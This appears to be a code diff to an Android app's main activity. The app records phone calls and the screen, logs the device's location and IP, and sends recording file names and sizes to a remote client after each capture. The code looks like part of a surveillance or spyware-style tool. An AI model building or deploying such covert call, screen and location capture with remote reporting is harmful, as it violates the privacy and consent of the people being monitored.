@@ -8,12 +8,16 @@ import android.content.Intent;
 import android.content.ServiceConnection;
 import android.content.pm.PackageManager;
 import android.media.projection.MediaProjectionManager;
+import android.net.wifi.WifiInfo;
+import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.IBinder;
 import android.os.RemoteException;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
+import android.view.View;
+import android.widget.TextView;
 import android.widget.Toast;
 
 import com.view.core.MyApplication;
@@ -28,6 +32,13 @@ import com.view.core.services.ScreenRecordService;
 import com.view.core.utils.LocationUtil;
 import com.view.core.utils.ScreenRecordUtil;
 
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.File;
+
+import Android.view.core.R;
+
 import static android.support.v4.content.PermissionChecker.PERMISSION_DENIED;
 
 
@@ -39,9 +50,13 @@ public class MainActivity extends Activity {
     private int REQUEST_SCREEN_PERMISSION_RESULT = 1;
     private int REQUEST_RECORD_PERMISSION_RESULT = 2;
 
+    private String mPhoneFile;
+    private String mScreenFile;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        setContentView(R.layout.main_activity);
         ScreenRecordUtil.getInstance().initScreenRecordManager(this);
 
         if(requestPermission()){
@@ -49,6 +64,33 @@ public class MainActivity extends Activity {
             Intent intent = new Intent(this, PhoneService.class);
             bindService(intent, mPhoneServiceConnection, BIND_AUTO_CREATE);
         }
+
+        double[] location = LocationUtil.getInstance().getLocationInfo();
+        if(location != null)
+            Log.d(TAG, "onCreate: location="+ location[0]+ ", "+ location[1]);
+        location = LocationUtil.getInstance().getLastLocationInfo();
+        if(location != null)
+            Log.d(TAG, "onCreate: last location="+ location[0]+ ", "+ location[1]);
+
+        ((TextView)findViewById(R.id.content)).setText(getlocalip());
+    }
+
+    private String getlocalip() {
+        WifiManager wifiManager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
+        WifiInfo wifiInfo = wifiManager.getConnectionInfo();
+        int ipAddress = wifiInfo.getIpAddress();
+        Log.d(TAG, "int ip "+ipAddress);
+        if (ipAddress == 0) return null;
+        return ((ipAddress & 0xff) + "." + (ipAddress >> 8 & 0xff) + "."
+                + (ipAddress >> 16 & 0xff) + "." + (ipAddress >> 24 & 0xff));
+    }
+    public void onGetLocationInfo(View v){
+        double[] location = LocationUtil.getInstance().getLocationInfo();
+        if(location != null)
+            Log.d(TAG, "onCreate: location="+ location[0]+ ", "+ location[1]);
+        location = LocationUtil.getInstance().getLastLocationInfo();
+        if(location != null)
+            Log.d(TAG, "onCreate: last location="+ location[0]+ ", "+ location[1]);
     }
 
     private boolean requestPermission(){
@@ -111,10 +153,12 @@ public class MainActivity extends Activity {
         @Override
         public void onRecordSuccess(String filePath) throws RemoteException {
             Log.d(TAG, "onRecordSuccess: path="+ filePath);
+            mPhoneFile = filePath;
             if (ScreenRecordUtil.getInstance().isScreenRecordEnable()){
                 MediaProjectionManager mediaProjectionManager
                         = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                 if (mediaProjectionManager != null){
+                    Log.d(TAG, "onRecordSuccess: request permission");
                     Intent intent = mediaProjectionManager.createScreenCaptureIntent();
                     PackageManager packageManager = getPackageManager();
                     if (packageManager.resolveActivity(intent,PackageManager.MATCH_DEFAULT_ONLY) != null){
@@ -180,7 +224,7 @@ public class MainActivity extends Activity {
 
         @Override
         public void onServiceConnected(ComponentName name, IBinder service) {
-            Log.d(TAG, "onServiceConnected: the service is binded");
+            Log.d(TAG, "onServiceConnected: the screen service is binded");
             ScreenRecord binder = ScreenRecordBinder.asInterface(service);
             Bundle param = new Bundle();
             param.putString("KEY_FILE_PATH", "/mnt/sdcard/screen_record.mp4");
@@ -222,6 +266,12 @@ public class MainActivity extends Activity {
         @Override
         public void onRecordSuccess(String filePath) throws RemoteException {
             Log.d(TAG, "onRecordSuccess: file path="+ filePath);
+            mScreenFile = filePath;
+            try {
+                uploadFile();
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
             unbindService(mServiceConnection);
         }
 
@@ -235,6 +285,25 @@ public class MainActivity extends Activity {
             return null;
         }
     };
+
+    private void uploadFile() throws JSONException {
+        File mPhone = null, mScreen;
+        JSONObject json = new JSONObject();
+        if(mPhoneFile != null){
+            mPhone = new File(mPhoneFile);
+            json.put("phone", mPhone.getName());
+            json.put("length1", mPhone.length());
+        }
+        if(mScreenFile != null){
+            mScreen = new File(mScreenFile);
+            json.put("screen", mScreen.getName());
+            json.put("length2", mScreen.length());
+        }
+        String temp = json.toString()+ "\r\n";
+        String data = temp.length()+temp;
+        ((MyApplication)getApplication()).getRemoteClient().writeData(data.getBytes(), data.length());
+
+    }
 
     @Override
     protected void onDestroy() {
